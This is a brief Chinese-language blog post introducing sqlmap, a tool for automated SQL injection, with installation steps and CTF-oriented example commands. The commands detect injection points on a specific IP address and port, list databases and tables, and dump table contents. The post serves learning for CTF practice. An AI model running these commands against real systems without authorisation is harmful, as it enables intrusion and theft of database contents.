---
title: Sqlmap 介绍
date: 2023-01-25 20:40:25
tags:
keywords: sqlmap, ctf tools, ctf 工具
description:
---

Sqlmap 是检测服务端是否存在SQL注入漏洞的自动化工具。因为其强大的检测能力，常用在CTF比赛的SQL注入类型的题目中。它的主要功能是扫描、发现并利用指定URL中的SQL注入漏洞，支持的数据库类型非常多。

## 安装

在 macOS 中，可以通过 `brew install sqlmap` 安装并通过命令行使用。

> 想知道 brew 怎么使用，可以参考 [Homebrew 介绍与上手指南](http://www.edulinks.cn/2020/06/23/20200623-homebrew-introduction/)

## 使用

sqlmap 常用命令及参数如下：

```sh
# 检测指定 URL 的注入点情况
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1
# 检测指定 URL 的注入点情况，并指定更多的参数，提高成功率
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 --level 2 --time-sec=10
# 指定注入点，查看当前数据库
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 --current-db
# 指定注入点，指定数据库名，查看数据库中所有表
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber --tables
# 指定注入点，指定数据库名和表名，查看表中具体内容
$ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber -T cyber --dump

# 利用 POST 参数进行探测, search 为参数
$ sqlmap -u http://223.112.5.156:53583/ --data=search=1  --current-db
```

## 参考资料

1. [sqlmap](https://sqlmap.org/)
1. [sqlmap简介及简单应用实例](https://blog.csdn.net/m0_64378913/article/details/124439539)